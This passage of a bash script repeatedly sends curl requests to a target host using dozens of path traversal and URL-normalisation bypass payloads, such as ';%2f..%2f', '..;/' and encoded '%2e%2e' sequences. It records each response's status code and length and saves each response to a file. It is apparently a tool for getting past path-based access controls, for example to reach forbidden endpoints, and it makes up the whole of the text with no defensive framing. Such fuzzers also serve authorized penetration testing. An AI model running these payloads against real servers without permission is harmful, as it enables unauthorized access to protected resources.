code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..%2f/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../%2f..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../%2f..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../%2f../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..///$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..///$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..///; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..///;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..///;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//;/;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..//;/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;/;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;/;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;/;/;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f../;/;/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;///$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;///$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;//;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;//;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;//;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;/;//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f..;/;//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f/%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/%2f../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/;/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/;/..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f/;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f;//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f;//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f;//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;%2f;/;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f;/;/..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;%2f;/;/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e%2f%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e%2f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2e. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e.$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2e.$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2f%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f%2f../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f/..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f/..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/%2f/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.%2e$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e/%2e%2e/%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.%2e/%2e%2e/%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.%2e/%2e%2e/%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f%2f../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..%2f//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../%2f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../..//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../..//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.././../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.././../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.././../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../.;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../.;/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../.;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2e%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//%2e%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//%2e%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..///$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..///$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/../;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../;/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/../;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/..; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/..;$PAT" -H "$user_agent")
print
echo -n "Payload [ ;/.;. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.;.$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;/.;.$PAT" -H "$user_agent")
print
echo -n "Payload [ ;//%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//%2f../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;//.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;//../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//../../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;//../../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;///.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///..$PAT" -H "$user_agent")
print
echo -n "Payload [ ;///../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;///..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///..//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;///..//$PAT" -H "$user_agent")
print
echo -n "Payload [ ;x ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x$PAT" -H "$user_agent"
